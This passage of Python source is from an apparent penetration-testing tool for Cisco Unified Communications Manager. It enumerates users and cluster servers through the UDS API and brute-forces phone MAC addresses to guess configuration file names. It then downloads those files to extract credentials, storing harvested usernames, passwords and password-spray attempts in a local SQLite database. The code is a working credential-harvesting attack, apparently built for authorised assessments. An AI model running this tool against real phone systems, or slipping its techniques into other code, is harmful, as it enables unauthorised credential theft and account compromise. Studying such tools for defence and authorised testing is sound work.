            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            device TEXT NOT NULL,
            username TEXT NOT NULL,
            discovery_time TEXT NOT NULL,
            UNIQUE(cucm_host, device, username)
        )
    ''')
    
    # Create table for discovered MAC prefixes
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS mac_prefixes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            phone_ip TEXT NOT NULL,
            full_mac TEXT NOT NULL,
            partial_mac TEXT NOT NULL,
            discovery_time TEXT NOT NULL,
            UNIQUE(cucm_host, full_mac)
        )
    ''')

    # Create table for CUCM-to-phone mappings
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS phone_cucm (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            phone_ip TEXT NOT NULL,
            discovery_time TEXT NOT NULL,
            UNIQUE(cucm_host, phone_ip)
        )
    ''')

    # Create table for CUCM cluster topology discovered via UDS /cucm-uds/servers
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS cluster_servers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            queried_host TEXT NOT NULL,
            hostname TEXT,
            ipv4 TEXT,
            ipv6 TEXT,
            server_type TEXT,
            discovery_time TEXT NOT NULL,
            UNIQUE(queried_host, hostname, ipv4)
        )
    ''')

    # Create table for users enumerated via UDS /cucm-uds/users (spray feature)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS uds_users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            username TEXT NOT NULL,
            first_seen TEXT NOT NULL,
            last_seen TEXT NOT NULL,
            UNIQUE(cucm_host, username)
        )
    ''')

    # Create table for every spray attempt against the UDS user endpoint
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS spray_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            status_code INTEGER,
            error TEXT,
            attempt_time TEXT NOT NULL
        )
    ''')
    cursor.execute('''
        CREATE INDEX IF NOT EXISTS idx_spray_attempts_user_time
            ON spray_attempts(username, attempt_time)
    ''')

    conn.commit()
    conn.close()
    return db_file

def check_already_attempted(cucm_host, filename, db_file='thief.db'):
    """
    Check if we've already attempted to download this file
    
    Returns:
        (bool, bool, str): (was_attempted, was_successful, content)
    """
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT success, content FROM download_attempts 
            WHERE cucm_host = ? AND filename = ?
        ''', (cucm_host, filename))
        
        result = cursor.fetchone()
        conn.close()
        
        if result:
            return (True, bool(result[0]), result[1] if result[1] else None)
        return (False, False, None)
    except:
        return (False, False, None)

def log_download_attempt(cucm_host, filename, success, method, content=None, db_file='thief.db'):
    """
    Log a download attempt to the database with retry logic for SQLite locking
    """
    max_retries = 5
    retry_delay = 0.1
    
    for attempt in range(max_retries):
        try:
            conn = sqlite3.connect(db_file, timeout=30.0)
            cursor = conn.cursor()
            
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            cursor.execute('''
                INSERT OR REPLACE INTO download_attempts 
                (cucm_host, filename, attempt_time, success, method, content)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (cucm_host, filename, timestamp, 1 if success else 0, method, content))
            
            conn.commit()
            conn.close()
            return  # Success, exit function
        except sqlite3.OperationalError as e:
            if "locked" in str(e).lower() and attempt < max_retries - 1:
                # Database is locked, wait and retry
                time.sleep(retry_delay * (2 ** attempt))  # Exponential backoff
                continue
            else:
                # Give up after max retries or non-locking error
                if globals().get('debug', False):
                    print(f'[!] Database error: {str(e)}')
                break
        except Exception as e:
            if globals().get('debug', False):
                print(f'[!] Database error: {str(e)}')
            break

def log_credentials_to_db(cucm_host, credentials, usernames, db_file='thief.db'):
    """
    Log discovered credentials and usernames to database
    """
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Log credentials (upsert by device, strip .cnf.xml if present)
        for cred in credentials:
            username = cred[0] if cred[0] else None
            password = cred[1]
            device = cred[2]
            if device.endswith('.cnf.xml'):
                device = device[:-8]
            cursor.execute('''
                INSERT OR REPLACE INTO credentials (cucm_host, device, username, password, discovery_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (cucm_host, device, username, password, timestamp))

        # Log usernames (upsert by device, strip .cnf.xml if present)
        for user in usernames:
            username = user[0]
            device = user[1]
            if device.endswith('.cnf.xml'):
                device = device[:-8]
            cursor.execute('''
                INSERT OR REPLACE INTO usernames (cucm_host, device, username, discovery_time)
                VALUES (?, ?, ?, ?)
            ''', (cucm_host, device, username, timestamp))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        try:
            conn = sqlite3.connect(db_file)
            cursor = conn.cursor()
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            # Log credentials
            for cred in credentials:
                username = cred[0] if cred[0] else None
                password = cred[1]
                device = cred[2]

                cursor.execute('''
                    INSERT INTO credentials (cucm_host, device, username, password, discovery_time)
                    VALUES (?, ?, ?, ?, ?)
                ''', (cucm_host, device, username, password, timestamp))

            # Log usernames
            for user in usernames:
                username = user[0]
                device = user[1]

                cursor.execute('''
                    INSERT INTO usernames (cucm_host, device, username, discovery_time)
                    VALUES (?, ?, ?, ?)
                ''', (cucm_host, device, username, timestamp))
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            print(f'[ERROR] log_credentials_to_db exception: {e}')
            return False
def log_mac_prefix_to_db(cucm_host, phone_ip, full_mac, partial_mac, db_file='thief.db'):
    """
    Log discovered MAC prefix to database
    
    Args:
        cucm_host: CUCM server hostname/IP
        phone_ip: Phone IP address where MAC was discovered
        full_mac: Full 12-character MAC address
        partial_mac: Partial 9-character MAC prefix
        db_file: Database file path
    """
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Use INSERT OR IGNORE to skip duplicates
        cursor.execute('''
            INSERT OR IGNORE INTO mac_prefixes (cucm_host, phone_ip, full_mac, partial_mac, discovery_time)
            VALUES (?, ?, ?, ?, ?)
        ''', (cucm_host, phone_ip, full_mac, partial_mac, timestamp))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        return False


def log_cluster_servers_to_db(queried_host, servers, db_file='thief.db'):
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        inserted = 0
        for srv in servers:
            hostname = srv.get('hostName') or ''
            ipv4 = srv.get('ipv4Address') or ''
            ipv6 = srv.get('ipv6Address') or ''
            server_type = srv.get('serverType') or ''
            if not (hostname or ipv4 or ipv6):
                continue
            cursor.execute('''
                INSERT OR IGNORE INTO cluster_servers
                    (queried_host, hostname, ipv4, ipv6, server_type, discovery_time)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (queried_host, hostname, ipv4, ipv6, server_type, timestamp))
            inserted += cursor.rowcount
        conn.commit()
        conn.close()
        return inserted
    except Exception as e:
        if globals().get('debug', False):
            print(f'[!] log_cluster_servers_to_db error: {e}')
        return 0


def log_phone_cucm_to_db(cucm_host, phone_ip, db_file='thief.db'):
    """
    Log CUCM server mapping for a discovered phone.
    """
    try:
        match = re.match(r'^(SEP.{12})', phone_ip, re.IGNORECASE)
        normalized_phone = match.group(1).upper() if match else phone_ip
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute('''SELECT 1 FROM phone_cucm WHERE cucm_host = ? AND phone_ip LIKE ?''', (cucm_host, normalized_phone+'%'))
        if cursor.fetchone():
            conn.close()
            return False
        cursor.execute('''
            INSERT INTO phone_cucm (cucm_host, phone_ip, discovery_time)
            VALUES (?, ?, ?)
        ''', (cucm_host, phone_ip, timestamp))
        conn.commit()
        conn.close()
        return True
    except Exception:
        return False

def display_database_summary(db_file='thief.db', cucm_filter=None):
    """
    Display credentials discovery summary from database
    
    Args:
        db_file: Path to SQLite database file
        cucm_filter: Optional CUCM host to filter results (default: show all)
    """
    try:
        if not os.path.exists(db_file):
            print(f'[-] Database not found: {db_file}')
            print(f'[-] Run a scan first to populate the database')
            return
        
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        
        # Get credentials
        if cucm_filter:
            cursor.execute('''
                SELECT cucm_host, device, username, password, discovery_time 
                FROM credentials 
                WHERE cucm_host = ?
                ORDER BY discovery_time DESC, device
            ''', (cucm_filter,))
        else:
            cursor.execute('''
                SELECT cucm_host, device, username, password, discovery_time 
                FROM credentials 
                ORDER BY discovery_time DESC, device
            ''')
        
        credentials = cursor.fetchall()
        
        # Get usernames (handle missing table gracefully)
        try:
            if cucm_filter:
                cursor.execute('''
                    SELECT cucm_host, device, username, discovery_time 
                    FROM usernames 
                    WHERE cucm_host = ?
                    ORDER BY discovery_time DESC, device
                ''', (cucm_filter,))
            else:
                cursor.execute('''
                    SELECT cucm_host, device, username, discovery_time 
                    FROM usernames 
                    ORDER BY discovery_time DESC, device
                ''')
            usernames = cursor.fetchall()
        except sqlite3.OperationalError as e:
            if 'no such table' in str(e):
                usernames = []
            else:
                raise
        
        # Get MAC prefixes (handle missing table gracefully)
        mac_prefixes = []
        try:
            if cucm_filter:
                cursor.execute('''
                    SELECT cucm_host, phone_ip, full_mac, partial_mac, discovery_time 
                    FROM mac_prefixes 
                    WHERE cucm_host = ?
                    ORDER BY discovery_time DESC
                ''', (cucm_filter,))
            else:
                cursor.execute('''
                    SELECT cucm_host, phone_ip, full_mac, partial_mac, discovery_time 
                    FROM mac_prefixes 
                    ORDER BY discovery_time DESC
                ''')
            mac_prefixes = cursor.fetchall()
        except sqlite3.OperationalError as e:
            if 'no such table' in str(e):
                mac_prefixes = []
            else:
                raise
        
        # Get phone -> CUCM mappings (handle missing table gracefully)
        phone_cucm = []
        try:
            if cucm_filter:
                cursor.execute('''
                    SELECT cucm_host, phone_ip, discovery_time
                    FROM phone_cucm
                    WHERE cucm_host = ?
                    ORDER BY discovery_time DESC
                ''', (cucm_filter,))
            else:
                cursor.execute('''
                    SELECT cucm_host, phone_ip, discovery_time
                    FROM phone_cucm
                    ORDER BY discovery_time DESC
                ''')
            phone_cucm = cursor.fetchall()
        except sqlite3.OperationalError as e:
            if 'no such table' in str(e):
                phone_cucm = []
            else:
                raise

        # Get cluster servers (handle missing table gracefully)
        cluster_servers = []
        try:
            if cucm_filter:
                cursor.execute('''
                    SELECT queried_host, hostname, ipv4, ipv6, server_type, discovery_time
                    FROM cluster_servers
                    WHERE queried_host = ?
                    ORDER BY discovery_time DESC
                ''', (cucm_filter,))
            else:
                cursor.execute('''
                    SELECT queried_host, hostname, ipv4, ipv6, server_type, discovery_time
                    FROM cluster_servers
                    ORDER BY discovery_time DESC
                ''')
            cluster_servers = cursor.fetchall()
        except sqlite3.OperationalError as e:
            if 'no such table' in str(e):
                cluster_servers = []
            else:
                raise

        # Get download stats (handle missing table gracefully)
        total_attempts = 0
        successful_downloads = 0
        try:
            if cucm_filter:
                cursor.execute('''
                    SELECT COUNT(*), SUM(success) 
                    FROM download_attempts 
                    WHERE cucm_host = ?
                ''', (cucm_filter,))
            else:
                cursor.execute('''
                    SELECT COUNT(*), SUM(success) 
                    FROM download_attempts
                ''')
            stats = cursor.fetchone()
            total_attempts = stats[0] if stats and stats[0] else 0
            successful_downloads = stats[1] if stats and stats[1] else 0
        except sqlite3.OperationalError as e:
            if 'no such table' in str(e):
                total_attempts = 0
                successful_downloads = 0
            else:
                raise
        
        conn.close()
        
        if not credentials and not usernames and not mac_prefixes and not phone_cucm and not cluster_servers:
            print(f'\n[-] No data found in database')
            if cucm_filter:
                print(f'[-] Filter: CUCM host = {cucm_filter}')
            return
        
        # Display summary
        print(f'\n\n{"="*70}')
        print(f'{"DATABASE SUMMARY":^70}')
        if cucm_filter:
            print(f'{f"Filter: {cucm_filter}":^70}')
        print("="*70)
        
        # Always define these to avoid unbound errors
        devices_with_creds = {}
        devices_with_users = {}
        if credentials:
            # Group by device
            cucm_hosts = set()
            devices_with_passwords = set()
            for cucm, device, username, password, timestamp in credentials:
                cucm_hosts.add(cucm)
                if device not in devices_with_creds:
                    devices_with_creds[device] = []
                devices_with_creds[device].append((username, password, timestamp))
                if password:
                    devices_with_passwords.add(device)
            print(f'\n\033[1m[+] CREDENTIALS FOUND ({len(credentials)} total)\033[0m')
            if len(cucm_hosts) > 1:
                print(f'    CUCM Hosts: {", ".join(sorted(cucm_hosts))}')
            print("-"*70)
            print(f'{"Device":<20} {"Username":<20} {"Password":<20}')
            print("-"*70)
            for device in sorted(devices_with_creds.keys()):
                for username, password, timestamp in devices_with_creds[device]:
                    user_display = username if username else 'N/A'
                    print(f'{device:<20} {user_display:<20} \033[91m{password:<20}\033[0m')
            if devices_with_passwords:
                print("\nAdd these to plextrac")
                for device in sorted(devices_with_passwords):
                    print(device)
        if usernames:
            # Group by device
            cucm_hosts = set()
            for cucm, device, username, timestamp in usernames:
                cucm_hosts.add(cucm)
                if device not in devices_with_users:
                    devices_with_users[device] = []
                devices_with_users[device].append((username, timestamp))
            print(f'\n\033[1m[+] USERNAMES FOUND ({len(usernames)} total)\033[0m')
            if len(cucm_hosts) > 1 and not credentials:
                print(f'    CUCM Hosts: {", ".join(sorted(cucm_hosts))}')
            print("-"*70)
            print(f'{"Device":<20} {"Username":<20}')
            print("-"*70)
            for device in sorted(devices_with_users.keys()):
                for username, timestamp in devices_with_users[device]:
                    print(f'{device:<20} {username:<20}')
        
        if mac_prefixes:
            # Group by CUCM host
            cucm_macs = {}
            for cucm, phone_ip, full_mac, partial_mac, timestamp in mac_prefixes:
                if cucm not in cucm_macs:
                    cucm_macs[cucm] = []
                cucm_macs[cucm].append((phone_ip, full_mac, partial_mac, timestamp))
            
            print(f'\n\033[1m[+] MAC PREFIXES DISCOVERED ({len(mac_prefixes)} total)\033[0m')
            print("-"*70)
            print(f'{"Phone IP":<18} {"Full MAC":<15} {"Prefix (9 char)":<15} {"CUCM Host":<20}')
            print("-"*70)
            for cucm in sorted(cucm_macs.keys()):
                for phone_ip, full_mac, partial_mac, timestamp in cucm_macs[cucm]:
                    print(f'{phone_ip:<18} {full_mac:<15} {partial_mac:<15} {cucm:<20}')
            
            # Display unique prefix list for easy reference
            unique_prefixes = sorted(set(p[3] for p in mac_prefixes))
            print(f'\n\033[1mUnique MAC Prefixes for Brute Force ({len(unique_prefixes)} unique):\033[0m')
            print(f'  {", ".join(unique_prefixes)}')

        if phone_cucm:
            cucm_phones = {}
            for cucm, phone_ip, timestamp in phone_cucm:
                if cucm not in cucm_phones:
                    cucm_phones[cucm] = []
                cucm_phones[cucm].append((phone_ip, timestamp))

            print(f'\n\033[1m[+] PHONE -> CUCM MAPPINGS ({len(phone_cucm)} total)\033[0m')
            print("-"*70)
            print(f'{"Phone IP":<18} {"CUCM Host":<30}')
            print("-"*70)
            for cucm in sorted(cucm_phones.keys()):
                for phone_ip, timestamp in cucm_phones[cucm]:
                    print(f'{phone_ip:<18} {cucm:<30}')

        if cluster_servers:
            print(f'\n\033[1m[+] CUCM CLUSTER SERVERS ({len(cluster_servers)} total)\033[0m')
            print("-"*70)
            print(f'{"Queried Host":<24} {"Hostname":<30} {"IPv4":<16}')
            print("-"*70)
            for queried, hostname, ipv4, ipv6, srv_type, timestamp in cluster_servers:
                print(f'{queried:<24} {(hostname or ""):<30} {(ipv4 or ""):<16}')

        print(f'\n{"="*70}')
        print(f'\n\033[1mDATABASE STATISTICS:\033[0m')
        print(f'  • Total download attempts:      {total_attempts}')
        print(f'  • Successful downloads:         {successful_downloads}')
        if mac_prefixes:
            print(f'  • MAC prefixes discovered:      {len(mac_prefixes)}')
            unique_prefixes = len(set(p[3] for p in mac_prefixes))
            print(f'  • Unique MAC prefixes:          {unique_prefixes}')
        if phone_cucm:
            print(f'  • Phone -> CUCM mappings:       {len(phone_cucm)}')
        if credentials:
            print(f'  • Devices with credentials:     {len(devices_with_creds)}')
        if usernames:
            print(f'  • Devices with usernames only:  {len(devices_with_users)}')
        print(f'  • Total credentials discovered: {len(credentials)}')
        print(f'  • Total usernames discovered:   {len(usernames)}')
        print("="*70)
        
    except sqlite3.Error as e:
        print(f'[-] Database error: {str(e)}')
    except Exception as e:
        print(f'[-] Error displaying database summary: {str(e)}')

def get_phones_from_gowitness(gowitness_db):
    """
    Extract Cisco phone IP addresses from gowitness SQLite database
    
    Args:
        gowitness_db: Path to gowitness SQLite database file
    
    Returns:
        List of IP addresses
    """
    try:
        if not os.path.exists(gowitness_db):
            print(f'[-] Error: Gowitness database not found: {gowitness_db}')
            print(f'[-] Please verify the path and try again')
            return []
        
        conn = sqlite3.connect(gowitness_db)
        cursor = conn.cursor()
        
        # Check if results table exists
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='results'")
        if not cursor.fetchone():
            print(f'[-] Error: No "results" table found in {gowitness_db}')
            print(f'[-] This may not be a valid gowitness database')
            conn.close()
            return []
        
        cursor.execute('''
            SELECT DISTINCT REPLACE(SUBSTR(url, 8, INSTR(SUBSTR(url, 8), ':') - 1), '/', '') as ip 
            FROM results 
            WHERE title LIKE '%Cisco%' 
            ORDER BY ip
        ''')
        
        results = cursor.fetchall()
        conn.close()
        
        phones = [row[0] for row in results if row[0]]
        
        if phones:
            print(f'[+] Found {len(phones)} Cisco phone(s) in gowitness database')
        else:
            print('[-] No Cisco phones found in gowitness database')
            print('[-] Make sure the database contains Cisco phone entries')
        
        return phones
    except sqlite3.Error as e:
        print(f'[-] SQLite error reading gowitness database: {str(e)}')
        return []
    except Exception as e:
        print(f'[-] Unexpected error reading gowitness database: {str(e)}')
        return []

def main():
    global debug, found_credentials, found_usernames, file_names, hostnames, db_file, no_db, force_download
    
    # Show banner before parsing arguments so it displays with --help
    banner()

    from seeyoucm_thief import __version__
    parser = argparse.ArgumentParser(description='Penetration toolkit for extracting credentials from Cisco phone systems')
    parser.add_argument('-V', '--version', action='version', version=f'%(prog)s {__version__}')

    # Target Specification
    parser.add_argument('-H','--host', default=None, type=str, help='Specify CUCM (Cisco Unified Communications Manager) IP address')
    parser.add_argument('-p','--phone', type=str, action='append', help='Specify Cisco phone IP address (repeatable for multiple targets)')
    parser.add_argument('--gowitness', type=str, metavar='DB_FILE', help='Load phone targets from gowitness SQLite database')
    parser.add_argument('-e','--enumsubnet', type=str, help='Enumerate and attack entire subnet in CIDR notation (e.g., 192.168.1.0/24)')
    
    # Attack Options
    parser.add_argument('-b','--brute-mac', nargs='?', const=True, default=False, type=str, help='Brute force all MAC address variations for detected phone prefixes. Optionally specify number of suffix characters (e.g., -b 4 for last 4 chars, default: 3)')
    parser.add_argument('-T','--threads', type=int, default=40, help='Number of worker threads for brute force mode (default: 40)')
    parser.add_argument('--force', action='store_true', default=False, help='Bypass cache and force re-download of all configuration files')
    parser.add_argument('--userenum', action='store_true', default=False, help='Extract usernames via CUCM User Data Services (UDS) API')
    parser.add_argument('--servers', action='store_true', default=False, help='Enumerate the CUCM cluster topology via UDS /cucm-uds/servers (requires -H)')
    parser.add_argument('--http', action='store_true', default=False, help='Use HTTP (port 6970) as the primary download protocol, with TFTP fallback (default: TFTP first, HTTP fallback)')
    parser.add_argument('--uds-port', type=int, default=UDS_PORT, help=f'CUCM UDS API HTTPS port for --userenum (default: {UDS_PORT})')
    
    # Output Options
    parser.add_argument('--csv', type=str, metavar='FILENAME', help='Export discovered credentials to CSV file')
    parser.add_argument('--outfile', type=str, default='cucm_users.txt', help='Specify output file for enumerated usernames (default: cucm_users.txt)')
    
    # Database Options
    parser.add_argument('--db', type=str, metavar='FILENAME', default='thief.db', help='Specify SQLite database for caching results (default: thief.db)')
    parser.add_argument('--no-db', action='store_true', default=False, help='Disable database caching and operate without persistent storage')
    parser.add_argument('--show-db', action='store_true', default=False, help='Display summary of credentials stored in database and exit')
    
    # Debugging
    parser.add_argument('-d','--debug', action='store_true', default=False, help='Enable verbose output including all failed attempts and TFTP operations')

    args = parser.parse_args()

    # Handle --show-db early (display database summary and exit)
    if args.show_db:
        db_file = args.db
        cucm_filter = args.host
        if args.csv:
            # Export only devices with passwords (credentials) to CSV
            try:
                if not os.path.exists(db_file):
                    print(f'[-] Database not found: {db_file}')
                    print(f'[-] Run a scan first to populate the database')
                    quit(1)
                conn = sqlite3.connect(db_file)
                cursor = conn.cursor()
                # Get credentials (only those with a password)
                if cucm_filter:
                    cursor.execute('''
                        SELECT cucm_host, device, username, password, discovery_time 
                        FROM credentials 
                        WHERE cucm_host = ? AND password IS NOT NULL AND password != ''
                        ORDER BY discovery_time DESC, device
                    ''', (cucm_filter,))
                else:
                    cursor.execute('''
                        SELECT cucm_host, device, username, password, discovery_time 
                        FROM credentials 
                        WHERE password IS NOT NULL AND password != ''
                        ORDER BY discovery_time DESC, device
                    ''')
                credentials = cursor.fetchall()
                conn.close()
                csv_filename = args.csv if args.csv != True else 'seeyoucm_results.csv'
                # Only export credentials (no usernames-only rows)
                cred_rows = [(c[2], c[3], c[1]) for c in credentials]  # (username, password, device)
                export_to_csv(cred_rows, [], csv_filename)
                print(f'[+] Exported credentials (with passwords) to CSV: {csv_filename}')
            except Exception as e:
                print(f'[-] Error exporting credentials to CSV: {e}')
        display_database_summary(db_file, cucm_filter)
        quit(0)

    CUCM_host = args.host
    phones = args.phone if args.phone else []
    gowitness_db = args.gowitness
    
    # Load phones from gowitness database if specified
    if gowitness_db:
        gowitness_phones = get_phones_from_gowitness(gowitness_db)
        if gowitness_phones:
            phones.extend(gowitness_phones)
        else:
            print('[-] Failed to load phones from gowitness database')
            if not phones:
                print('[-] No phones available. Exiting.')
                quit(1)
    
    use_tftp = not args.http  # TFTP is default; --http flips to HTTP-first with TFTP fallback
    
    # Set debug flag so worker threads can access it
    debug = args.debug
    
    enumsubnet = args.enumsubnet
    # Determine brute force suffix length
    if args.brute_mac is True or args.brute_mac is False:
        brute_mac = bool(args.brute_mac)
        brute_mac_len = 3
    else:
        brute_mac = True
        try:
            brute_mac_len = int(args.brute_mac)
        except Exception:
            brute_mac_len = 3
    csv_output = args.csv
    threads = args.threads
    # In test mode, always use and populate the static test DB in tests/
    if _TEST_MODE:
        db_file = args.db
        init_database(db_file)
        test_filename = 'SEPTEST00000000.cnf.xml'
        fake_creds = [
            ('alice', 'wonderland', test_filename),
            ('bob', 'builder', test_filename),
            ('charlie', 'chocolate', test_filename)
        ]
        fake_users = [
            ('alice', test_filename),
            ('bob', test_filename),
            ('charlie', test_filename)
        ]
        admin_creds, admin_users = search_for_secrets('mock-cucm', test_filename, use_tftp=True)
        credentials = fake_creds + admin_creds
        usernames = fake_users + admin_users
        log_credentials_to_db('mock-cucm', credentials, usernames, db_file)
    else:
        db_file = args.db
    no_db = args.no_db
    force_download = args.force
    found_credentials = []
    found_usernames = []
    file_names = ''
    hostnames = []
    outfile = args.outfile
    
    # Initialize database unless --no-db is set
    if not no_db:
        if not os.path.exists(db_file):
            init_database(db_file)
        else:
            init_database(db_file)
    
    # Enable tftpy logging only in debug mode
    configure_tftpy_logging(debug)

    dbg(f'parsed args: host={CUCM_host} phones={phones} brute_mac={brute_mac} '
        f'enumsubnet={enumsubnet} userenum={args.userenum} servers={args.servers} use_tftp={use_tftp} '
        f'threads={threads} db={db_file} no_db={no_db} force={force_download}')

    if CUCM_host:
        version_info = get_version(CUCM_host, port=args.uds_port)
        if version_info:
            v = version_info.get('version', 'unknown')
            p = version_info.get('prefix')
            print(f'[+] CUCM {CUCM_host} version: {v}' + (f' (prefix {p})' if p else ''))
        else:
            print(f'[-] Could not retrieve CUCM version from https://{CUCM_host}:{args.uds_port}/cucm-uds/version (run with -d for details)')

    if args.servers:
        if not CUCM_host:
            print('--servers requires -H/--host to specify the CUCM server')
            quit(1)
        print(f'Enumerating CUCM cluster via https://{CUCM_host}:{args.uds_port}/cucm-uds/servers')
        servers = get_servers_api(CUCM_host, port=args.uds_port)
        if not servers:
            print('[-] No servers returned. Re-run with -d for request/response details.')
            quit(0)
        print(f'[+] Discovered {len(servers)} cluster member(s):')
        for srv in servers:
            host = srv.get('hostName', '?')
            ipv4 = srv.get('ipv4Address', '')
            ipv6 = srv.get('ipv6Address', '')
            srv_type = srv.get('serverType', '')
            parts = [host]
            if ipv4:
                parts.append(f'({ipv4})')
            if ipv6:
                parts.append(f'[v6: {ipv6}]')
            if srv_type:
                parts.append(f'<{srv_type}>')
            print('    ' + ' '.join(parts))
        if not no_db:
            inserted = log_cluster_servers_to_db(CUCM_host, servers, db_file)
            print(f'[+] Logged {inserted} new cluster server entry/entries to database')
        quit(0)

    if args.userenum:
        if not CUCM_host:
            print('--userenum requires -H/--host to specify the CUCM server')
            quit(1)
        print(f'Getting users from UDS API at https://{CUCM_host}:{args.uds_port}/cucm-uds/users')
        api_users = get_users_api(CUCM_host, port=args.uds_port)
        if api_users:
            unique_users = list(set(api_users))
            with open(outfile, mode='w') as outputfile:
                for line in unique_users:
                    outputfile.write(line + '\n')
            if not no_db:
                if log_uds_usernames_to_db(CUCM_host, unique_users, db_file):
                    print(f'[+] Logged {len(unique_users)} UDS API usernames to database')
                else:
                    print(f'[-] Failed to log UDS API usernames to database')
            print(f'The following {len(unique_users)} users were identified from the UDS API')
            print(f'[*] Usernames written to: {outfile}')
            if debug:
                for username in unique_users:
                    print(f'{username}')
        else:
            print('[-] No users returned from UDS API. Re-run with -d for request/response details.')
        quit(0)

    # Handle MAC brute forcing from detected phones
    if brute_mac:
        if not phones:
            print('You must specify at least one phone with -p when using --brute-mac')
            quit(1)
        
        print(f'MAC brute force mode enabled for {len(phones)} phone(s) with suffix length {brute_mac_len}\n')
        
        # Map each MAC prefix to its CUCM server
        mac_to_cucm = {}
        all_found_macs = set()
        
        # Detect MACs and CUCM from each phone (parallel)
        counts = {"success": 0, "fail": 0}
        detect_lock = threading.Lock()
        print_lock = threading.Lock()
        phone_index = {p: i for i, p in enumerate(phones)}

        def _safe_print(message):
            with print_lock:
                print(message)

        if threads < 1:
            print('Threads must be at least 1')
            quit(1)

        def detect_worker():
            while True:
                phone = phone_queue.get()
                if phone is None:
                    phone_queue.task_done()
                    break
                try:
                    index = phone_index.get(phone, 0) + 1
                    _safe_print(f'[{index}/{len(phones)}] Detecting MAC address from phone {phone}...')
                    hostname = get_hostname_from_phone(phone)
                    if hostname:
                        mac_match = re.search(r'SEP([0-9A-F]{12})', hostname, re.IGNORECASE)
                        if mac_match:
                            full_mac = mac_match.group(1).upper()
                            prefix_len = 12 - brute_mac_len
                            if prefix_len < 0:
                                _safe_print(f'  ✗ Invalid brute_mac_len: {brute_mac_len} (must be <= 12)')
                                with detect_lock:
                                    counts["fail"] += 1
                                phone_queue.task_done()
                                continue
                            partial_mac = full_mac[:prefix_len]
                            _safe_print(f'  ✓ Detected: SEP{full_mac}')

                            if CUCM_host:
                                phone_cucm = CUCM_host
                            else:
                                phone_cucm = get_cucm_name_from_phone(phone)
                                if not phone_cucm:
                                    _safe_print(f'  ✗ Could not detect CUCM host from phone {phone}')
                                    _safe_print(f'  → Skipping this phone, continuing with others...\n')
                                    with detect_lock:
                                        counts["fail"] += 1
                                    phone_queue.task_done()
                                    continue

                            _safe_print(f'  ✓ CUCM Server: {phone_cucm}')
                            _safe_print(f'  → Using partial MAC: {partial_mac} for brute force\n')

                            with detect_lock:
                                all_found_macs.add(partial_mac)
                                mac_to_cucm[partial_mac] = phone_cucm
                                counts["success"] += 1

                            if not no_db:
                                log_phone_cucm_to_db(phone_cucm, phone, db_file)
                                log_mac_prefix_to_db(phone_cucm, phone, full_mac, partial_mac, db_file)
                        else:
                            _safe_print(f'  ✗ Could not extract MAC from hostname: {hostname}')
                            _safe_print(f'  → Skipping this phone, continuing with others...\n')
                            with detect_lock:
                                counts["fail"] += 1
                    else:
                        _safe_print(f'  ✗ Could not detect hostname from phone {phone}')
                        _safe_print(f'  → Phone may be unreachable or not a Cisco device')
                        _safe_print(f'  → Skipping this phone, continuing with others...\n')
                        with detect_lock:
                            counts["fail"] += 1
                except Exception as e:
                    _safe_print(f'  ✗ Error detecting MAC from {phone}: {str(e)}')
                    _safe_print(f'  → Skipping this phone, continuing with others...\n')
                    with detect_lock:
                        counts["fail"] += 1
                finally:
                    phone_queue.task_done()

        phone_queue = queue.Queue()
        num_detect_workers = min(threads, len(phones))
        detect_threads = []
        for i in range(num_detect_workers):
            t = threading.Thread(target=detect_worker, daemon=True, name=f'DetectWorker-{i}')
            t.start()
            detect_threads.append(t)

        try:
            for phone in phones:
                phone_queue.put(phone)
            phone_queue.join()
        except KeyboardInterrupt:
            _safe_print(f'\n[!] Interrupted by user. Stopping phone detection.')
        finally:
            for _ in range(num_detect_workers):
                phone_queue.put(None)
            for t in detect_threads:
                t.join()
        
        print(f'Phone detection complete: {counts["success"]} succeeded, {counts["fail"]} failed\n')
        
        if not all_found_macs:
            print('No MAC addresses detected. Cannot proceed with brute force.')
            quit(1)
        
        # Build combined list of all MAC candidates from all phones
        print(f'Building randomized candidate list for {len(all_found_macs)} MAC prefix(es)...')
        candidates_by_cucm = {}
        max_variations = 16 ** brute_mac_len
        for partial_mac in all_found_macs:
            phone_cucm = mac_to_cucm[partial_mac]
            if phone_cucm not in candidates_by_cucm:
                candidates_by_cucm[phone_cucm] = set()
            for i in range(max_variations):
                suffix = f'{i:0{brute_mac_len}X}'.zfill(brute_mac_len)
                # Always ensure full_mac is 12 characters
                full_mac = (partial_mac + suffix)[:12]
                filename = f'SEP{full_mac}.cnf.xml'
